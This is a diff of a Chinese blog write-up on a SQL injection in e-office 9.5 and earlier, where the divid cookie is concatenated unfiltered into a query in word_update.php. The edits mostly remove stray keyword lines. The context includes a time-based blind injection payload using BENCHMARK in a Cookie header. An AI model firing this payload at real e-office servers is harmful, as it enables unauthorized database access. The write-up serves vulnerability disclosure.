@@ -22,8 +22,6 @@ e-office <=9.5
 
 general/system/interface/loginedit/word\_update.php 业务逻辑如下
 
-编程
-
 ```
 <?php
 
@@ -41,14 +39,6 @@ if ( $content == "" && $wordcolor )
     $TEMPID = $ROW['TEMPID'];
 ```
 
-深入探索
-
-网络浏览器
-
-vpn
-
-开放源代码
-
 `divid` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
 # 漏洞复现
@@ -63,15 +53,7 @@ Cookie: divid=1 AND 3742=BENCHMARK(4000000,MD5(0x496c624d));wordcolor=5;content=
 
 成功在延时 4 秒
 
-商务软件和生产力软件
-
-深入探索
-
-搜索引擎
-
-代理与过滤
-
-Linux
+编程
 
 [sqlmap](https://mrxn.net/tag/sqlmap) 结果如下
 
